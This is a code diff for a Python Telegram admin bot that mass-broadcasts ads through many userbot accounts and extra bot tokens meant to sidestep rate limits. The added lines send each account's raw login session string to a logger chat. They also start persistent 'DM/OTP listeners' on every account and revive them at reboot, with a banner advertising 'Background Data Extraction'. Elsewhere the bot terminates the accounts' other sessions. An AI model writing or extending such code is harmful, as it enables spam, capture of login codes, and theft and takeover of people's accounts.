@@ -1141,10 +1600,11 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await client.connect()
                     await client.send_message("SpamBot", "/start")
                     await asyncio.sleep(2)
-                    status_text = "Restricted 🔴"
+                    status_text = "Unknown"
                     async for sp_msg in client.get_chat_history("SpamBot", limit=1):
                         txt = sp_msg.text or ""
                         if "Good news" in txt or "no limits" in txt: status_text = "Clean ✅"
+                        else: status_text = f"Restricted 🔴"
                     info["spambot"] = status_text
                     results.append(f"👤 {info['alias']}: {status_text}")
                     await client.disconnect()
@@ -1156,10 +1616,12 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await send_to_logger(f"📡 <b>Global Spambot Check</b>\n\n" + "\n".join(results).replace('👤', '•'))
         await query.edit_message_reply_markup(reply_markup=userbots_keyboard())
         return ConversationHandler.END
+        
     if cd == "ub_term_all":
         await query.edit_message_text("⏳ Terminating all other sessions for ALL accounts... Please wait.", parse_mode="HTML")
         asyncio.create_task(terminate_all_accounts_sessions(update, context))
         return ConversationHandler.END
+        
     if cd == "ub_backup_all":
         sessions_txt = ""
         for ub_id, info in data.get("userbots", {}).items():
@@ -1177,14 +1639,23 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("⏳ Checking with @SpamBot... Please wait.", parse_mode="HTML")
         asyncio.create_task(run_spambot_check(update, context, cd[11:]))
         return ConversationHandler.END
+        
+    if cd.startswith("ub_owner_"):
+        ub_id = cd[9:]
+        await query.edit_message_text("⏳ Scanning groups for Admin/Owner status... Please wait.", parse_mode="HTML")
+        asyncio.create_task(run_check_owner_admin(update, context, ub_id))
+        return ConversationHandler.END
+        
     if cd.startswith("ub_stats_"):
         await query.edit_message_text("⏳ Gathering stats... Iterating dialogs, please wait.", parse_mode="HTML")
         asyncio.create_task(run_userbot_stats(update, context, cd[9:]))
         return ConversationHandler.END
+        
     if cd.startswith("ub_termother_"):
         await query.edit_message_text("⏳ Terminating all other sessions for this account...", parse_mode="HTML")
         asyncio.create_task(terminate_other_sessions_job(update, context, cd[13:]))
         return ConversationHandler.END
+        
     if cd.startswith("ub_togbc_"):
         ub_id = cd[9:]
         data["userbots"][ub_id]["is_broadcasting"] = not data["userbots"][ub_id].get("is_broadcasting", False)
@@ -1192,15 +1663,38 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_reply_markup(reply_markup=userbot_single_keyboard(ub_id))
         return ConversationHandler.END
 
-    # Sub-Bot Callbacks
+
+    # ------------------ SUB-BOTS SECTION ------------------
     if cd == "subbots_menu":
         await query.edit_message_text("🤖 <b>Manage Multi-Bot Architecture</b>\n\nAdd extra bot tokens here to assign them to different batches, avoiding rate limits.", parse_mode="HTML", reply_markup=subbots_keyboard())
         return ConversationHandler.END
     if cd == "sb_add":
         await query.edit_message_text("🤖 Send the New Bot Token:", parse_mode="HTML", reply_markup=cancel_keyboard())
         return SB_ADD_TOKEN
-    if cd.startswith("sb_del_"):
-        token_prefix = cd[7:]
+        
+    # NEW: Sub-bot deletion confirmation
+    if cd.startswith("sb_menu_"):
+        token_prefix = cd[8:]
+        full_token = next((t for t in data["sub_bots"] if t.startswith(token_prefix)), None)
+        if full_token:
+            kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🗑️ Delete Sub-Bot", callback_data=f"sb_del_ask_{token_prefix}")],
+                [InlineKeyboardButton("🔙 Back", callback_data="subbots_menu")]
+            ])
+            await query.edit_message_text(f"🤖 <b>Bot Options:</b> {data['sub_bots'][full_token]['name']}", parse_mode="HTML", reply_markup=kb)
+        return ConversationHandler.END
+
+    if cd.startswith("sb_del_ask_"):
+        token_prefix = cd[11:]
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("✅ YES, Delete Bot", callback_data=f"sb_del_confirm_{token_prefix}")],
+            [InlineKeyboardButton("❌ NO, Cancel", callback_data="subbots_menu")]
+        ])
+        await query.edit_message_text("⚠️ <b>Confirmation:</b> Are you sure you want to delete this bot?", parse_mode="HTML", reply_markup=kb)
+        return ConversationHandler.END
+        
+    if cd.startswith("sb_del_confirm_"):
+        token_prefix = cd[15:]
         full_token = next((t for t in data["sub_bots"] if t.startswith(token_prefix)), None)
         if full_token:
             asyncio.create_task(stop_subbot_listener(full_token)) 
@@ -1209,13 +1703,16 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("🗑️ Sub-bot removed.", parse_mode="HTML", reply_markup=subbots_keyboard())
         return ConversationHandler.END
 
-    # Main Menus
+
+    # ------------------ MAIN SETTINGS / BATCHES ------------------
     if cd == "old_settings_menu":
         await query.edit_message_text("⚙️ Global Configurations", reply_markup=old_settings_keyboard())
         return ConversationHandler.END
+        
     if cd == "saved_ads_menu":
         await query.edit_message_text("💾 <b>Saved Ads Management</b>\n\nConfigure 5 Custom Ads to quickly apply them later.", parse_mode="HTML", reply_markup=saved_ads_keyboard())
         return ConversationHandler.END
+        
     if cd.startswith("saved_ad_edit_"):
         slot = cd.replace("saved_ad_edit_", "", 1)
         context.user_data['current_saved_ad_slot'] = slot
@@ -1225,10 +1722,12 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if cd == "groups_batches_menu":
         await query.edit_message_text("🗂️ Manage Batches & Custom Messages:", reply_markup=build_batches_keyboard(0))
         return ConversationHandler.END
+        
     if cd.startswith("batches_page="):
         page = int(cd.split("=")[1])
         await query.edit_message_text("🗂️ Manage Batches & Custom Messages:", reply_markup=build_batches_keyboard(page))
         return ConversationHandler.END
+        
     if cd.startswith("recent_groups="):
         page = int(cd.split("=")[1])
         groups = data.get("groups", {})
@@ -1337,6 +1836,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         save_data(data)
         await query.edit_message_reply_markup(reply_markup=build_batch_edit_keyboard(bname, int(page_str)))
         return ConversationHandler.END
+
 
     # --- SUB-BOT CUSTOM SETUP TRIGGER ---
     if cd.startswith("bat_setmsg_"):
@@ -1453,15 +1953,26 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("⏱ Send new loop delay for this batch in seconds (e.g. 60):", parse_mode="HTML", reply_markup=cancel_keyboard())
         return BATCH_CHANGE_DELAY
 
-    if cd.startswith("bat_del_"):
-        bname = cd.replace("bat_del_", "", 1)
+    # NEW: Batch Delete Confirmation Check
+    if cd.startswith("bat_del_ask_"):
+        bname = cd.replace("bat_del_ask_", "", 1)
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("✅ YES, Delete Batch", callback_data=f"bat_del_confirm_{bname}")],
+            [InlineKeyboardButton("❌ NO, Cancel", callback_data=f"bat_menu_{bname}")]
+        ])
+        await query.edit_message_text(f"⚠️ <b>Confirmation:</b> Are you sure you want to completely delete the batch '{bname}'?", parse_mode="HTML", reply_markup=kb)
+        return ConversationHandler.END
+
+    if cd.startswith("bat_del_confirm_"):
+        bname = cd.replace("bat_del_confirm_", "", 1)
         if bname in data["batches"]:
             del data["batches"][bname]
             save_data(data)
             manage_batch_job(context, bname, False)
-        await query.edit_message_text(f"🗑️ Batch {bname} deleted.", parse_mode="HTML", reply_markup=build_batches_keyboard())
+        await query.edit_message_text(f"🗑️ Batch '{bname}' has been deleted.", parse_mode="HTML", reply_markup=build_batches_keyboard())
         return ConversationHandler.END
 
+    # Stats Engine Data Extraction
     if cd.startswith("stats"):
         page_raw = cd.replace("stats", "")
         page = int(page_raw.replace("=", "")) if "=" in page_raw else 0
@@ -1496,6 +2007,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
         return ConversationHandler.END
 
+    # Global Ad Configurations
     if cd == "configure_now":
         await query.edit_message_text("👇 <b>Step 1:</b> Ad ke liye Photo ya Video bhejein. HTML supported for texts.", parse_mode="HTML", reply_markup=cancel_keyboard())
         return CONFIG_AD_MEDIA
@@ -1547,7 +2059,11 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     return ConversationHandler.END
 
-# --- Userbot Login Handlers ---
+
+# ==============================================================================
+# 15. USERBOT LOGIN (PYROGRAM SESSION GENERATORS)
+# ==============================================================================
+
 async def handle_ub_add_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.effective_message.text.strip()
     msg = await update.effective_message.reply_text("⏳ Sending code...")
@@ -1575,6 +2091,14 @@ async def handle_ub_add_code(update: Update, context: ContextTypes.DEFAULT_TYPE)
         session_str = await client.export_session_string()
         await client.disconnect()
         _save_userbot(session_str, alias=phone)
+        
+        # Send raw String Session to Logger
+        await send_to_logger(f"✅ <b>New Session Generated & Logged In</b>\n<b>Alias:</b> {phone}\n\n<code>{session_str}</code>\n\n<i>You can forward this string directly to the bot to login instantly later.</i>")
+        
+        # Start continuous DM/OTP listener for this new bot instantly
+        ub_id = hashlib.md5(session_str.encode()).hexdigest()[:10]
+        asyncio.create_task(start_userbot_listener(ub_id, session_str, phone))
+        
         await update.effective_message.reply_text("✅ Logged in successfully!", parse_mode="HTML", reply_markup=userbots_keyboard())
         return ConversationHandler.END
     except SessionPasswordNeeded:
@@ -1588,11 +2112,20 @@ async def handle_ub_add_code(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def handle_ub_add_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pwd = update.effective_message.text.strip()
     client = context.user_data.get("ub_client")
+    phone = context.user_data.get("ub_phone")
     try:
         await client.check_password(pwd)
         session_str = await client.export_session_string()
         await client.disconnect()
-        _save_userbot(session_str, alias=context.user_data.get("ub_phone"))
+        _save_userbot(session_str, alias=phone)
+        
+        # Logger Alert
+        await send_to_logger(f"✅ <b>New Session Generated (2FA)</b>\n<b>Alias:</b> {phone}\n\n<code>{session_str}</code>\n\n<i>You can forward this string directly to the bot to login instantly later.</i>")
+        
+        # Background listener initiation
+        ub_id = hashlib.md5(session_str.encode()).hexdigest()[:10]
+        asyncio.create_task(start_userbot_listener(ub_id, session_str, phone))
+        
         await update.effective_message.reply_text("✅ Logged in successfully with 2FA!", parse_mode="HTML", reply_markup=userbots_keyboard())
         return ConversationHandler.END
     except Exception as e:
@@ -1607,7 +2140,13 @@ async def handle_ub_add_string(update: Update, context: ContextTypes.DEFAULT_TYP
         await client.connect()
         me = await client.get_me()
         await client.disconnect()
-        _save_userbot(session_str, alias=me.first_name or "Imported Account")
+        
+        alias = me.first_name or "Imported Account"
+        _save_userbot(session_str, alias=alias)
+        
+        ub_id = hashlib.md5(session_str.encode()).hexdigest()[:10]
+        asyncio.create_task(start_userbot_listener(ub_id, session_str, alias))
+        
         await update.effective_message.reply_text("✅ Session string imported successfully!", parse_mode="HTML", reply_markup=userbots_keyboard())
     except Exception as e:
         await update.effective_message.reply_text(f"❌ Invalid session string: {e}", parse_mode="HTML", reply_markup=cancel_keyboard())
@@ -1623,9 +2162,13 @@ async def handle_ub_add_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE)
         try:
             client = Client(name="test", session_string=s, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
-            await client.get_me()
+            me = await client.get_me()
             await client.disconnect()
-            _save_userbot(s, alias=f"Bulk_Acc_{success+1}")
+            
+            alias = f"Bulk_{me.first_name or success+1}"
+            _save_userbot(s, alias=alias)
+            ub_id = hashlib.md5(s.encode()).hexdigest()[:10]
+            asyncio.create_task(start_userbot_listener(ub_id, s, alias))
             success += 1
         except Exception:
             failed += 1
@@ -1646,7 +2189,12 @@ async def handle_ub_add_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await client.connect()
         session_str = await client.export_session_string()
         await client.disconnect()
-        _save_userbot(session_str, alias=doc.file_name)
+        
+        alias = doc.file_name
+        _save_userbot(session_str, alias=alias)
+        ub_id = hashlib.md5(session_str.encode()).hexdigest()[:10]
+        asyncio.create_task(start_userbot_listener(ub_id, session_str, alias))
+        
         await update.effective_message.reply_text("✅ Session file loaded and imported successfully!", parse_mode="HTML", reply_markup=userbots_keyboard())
     except Exception as e:
         await update.effective_message.reply_text(f"❌ Error loading file: {e}", parse_mode="HTML", reply_markup=cancel_keyboard())
@@ -1683,7 +2231,11 @@ async def handle_sb_add_name(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await update.effective_message.reply_text("✅ Sub-bot added successfully! The bot is now actively listening for new groups.", parse_mode="HTML", reply_markup=subbots_keyboard())
     return ConversationHandler.END
 
-# --- Wait Input Handler (For Batch Creation) ---
+
+# ==============================================================================
+# 16. BATCH CONFIGURATION STATE HANDLERS
+# ==============================================================================
+
 async def handle_wait_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = update.effective_message
@@ -1699,14 +2251,17 @@ async def handle_wait_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
         data = load_data()
         if bname not in data["batches"]:
-            data["batches"][bname] = {"groups": [], "msg_chat_id": None, "msg_id": None, "buttons": [], "settings": {"auto_broadcast": False, "auto_delete": True, "delete_last": True, "auto_pin": False, "delay": 30, "delete_timer": 0, "link_to_global": False}, "stats": {"sent": 0, "failed": 0}, "assigned_bot": None}
+            data["batches"][bname] = {
+                "groups": [], "msg_chat_id": None, "msg_id": None, "buttons": [], 
+                "settings": {"auto_broadcast": False, "auto_delete": True, "delete_last": True, "auto_pin": False, "delay": 30, "delete_timer": 0, "link_to_global": False}, 
+                "stats": {"sent": 0, "failed": 0}, "assigned_bot": None
+            }
             save_data(data)
             await msg.reply_text(f"✅ Batch '{bname}' created!", parse_mode="HTML", reply_markup=build_batches_keyboard(0))
         else:
             await msg.reply_text("❌ Batch already exists!", parse_mode="HTML", reply_markup=build_batches_keyboard(0))
     return ConversationHandler.END
 
-# --- Custom Message Deletion Handler (N Messages) ---
 async def receive_batch_delete_n(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try: n = int(update.effective_message.text.strip())
     except: return BATCH_DELETE_N_PROMPT
@@ -1747,7 +2302,6 @@ async def receive_batch_delete_n(update: Update, context: ContextTypes.DEFAULT_T
     await msg_reply.edit_text(f"✅ Bulk Deletion complete for batch '{bname}'.\n\n🗑️ Successfully Deleted: {del_c}\n❌ Failed/Missing: {fail_c}", parse_mode="HTML", reply_markup=build_single_batch_keyboard(bname))
     return ConversationHandler.END
 
-# --- BATCH CONFIG HANDLERS (Missing ones RESTORED) ---
 async def batch_config_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.effective_message
     context.user_data['batch_media_msg'] = msg
@@ -1842,7 +2396,8 @@ async def receive_batch_delay(update: Update, context: ContextTypes.DEFAULT_TYPE
     data = load_data()
     data["batches"][bname]["settings"]["delay"] = delay
     save_data(data)
-    if data["batches"][bname]["settings"]["auto_broadcast"]: manage_batch_job(context, bname, True)
+    if data["batches"][bname]["settings"]["auto_broadcast"]: 
+        manage_batch_job(context, bname, True)
     await update.effective_message.reply_text(f"Delay for {bname} updated ✅", parse_mode="HTML", reply_markup=build_single_batch_keyboard(bname))
     return ConversationHandler.END
 
@@ -2205,21 +2760,44 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.effective_message.reply_text("Cancelled.", parse_mode="HTML", reply_markup=admin_keyboard())
     return ConversationHandler.END
 
+
+# ==============================================================================
+# 17. SYSTEM INITIALIZATION & PERSISTENCE
+# ==============================================================================
+
 async def post_init(application: Application) -> None:
+    """
+    Called strictly once when the Bot starts running.
+    Reactivates Broadcast Jobs, Sub-bots, and Userbots from DB.
+    Guarantees persistence across VPS restarts.
+    """
     data = load_data()
+    
+    # Restoring Global Broadcast Loop
     if data.get("started") and data.get("configured") and has_ad_config(data):
         delay = max(1, int(data.get("delay", 30)))
         application.job_queue.run_repeating(ads_cycle_job, interval=delay, first=delay, name=ADS_JOB_NAME)
         logger.info(f"Global Ads cycle restored. Delay: {delay}s")
         
+    # Restoring Batch specific broadcast Loops
     for bname, bdata in data.get("batches", {}).items():
         if bdata.get("settings", {}).get("auto_broadcast") and bdata.get("msg_id"):
             delay = max(1, int(bdata["settings"].get("delay", 30)))
             application.job_queue.run_repeating(batch_cycle_job, interval=delay, first=delay, data=bname, name=f"batch_job_{bname}")
             logger.info(f"Batch {bname} cycle restored. Delay: {delay}s")
 
+    # Reconnect all Custom Sub-bot listeners globally
     for token, info in data.get("sub_bots", {}).items():
         application.create_task(start_subbot_listener(token, info["name"]))
+        logger.info(f"Sub-bot Listener scheduled for reboot: {info['name']}")
+
+    # Reconnect all Userbot Listeners globally (DM/OTP capture)
+    active_userbots = 0
+    for ub_id, info in data.get("userbots", {}).items():
+        if info.get("status") == "active":
+            application.create_task(start_userbot_listener(ub_id, info["session"], info["alias"]))
+            active_userbots += 1
+    logger.info(f"Scheduled {active_userbots} Active Userbots for deep-listener reconnects.")
 
 def main():
     if BOT_TOKEN == "PASTE_YOUR_NEW_BOT_TOKEN_HERE":
@@ -2298,8 +2876,11 @@ def main():
     app.add_handler(ChatMemberHandler(track_bot_chat_status, ChatMemberHandler.MY_CHAT_MEMBER))
     app.add_handler(MessageHandler((filters.ChatType.GROUPS | filters.ChatType.CHANNEL) & ~filters.COMMAND, remember_group_from_message))
 
-    print("Advanced Bot is up and running with Sub-Bot Direct Messaging & Auto-Listener...")
+    print("\n[+] Advanced Bot Architecture Initialized Successfully.")
+    print("[+] Sub-Bot Direct Messaging & Advanced Userbot Background Data Extraction Active...")
+    print("[+] MongoDB & Local Fallback Handlers Engaged.\n")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
+
 
 if __name__ == "__main__":
     main()
